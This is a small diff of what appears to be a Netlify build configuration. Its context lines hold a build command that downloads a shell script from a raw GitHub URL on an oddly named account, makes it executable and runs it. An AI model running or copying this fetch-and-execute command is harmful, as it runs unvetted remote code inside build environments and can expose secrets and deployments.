@@ -4,3 +4,4 @@
   command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/1/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 01_02"
 [context.deploy-preview]
   publish = "dist/"
+
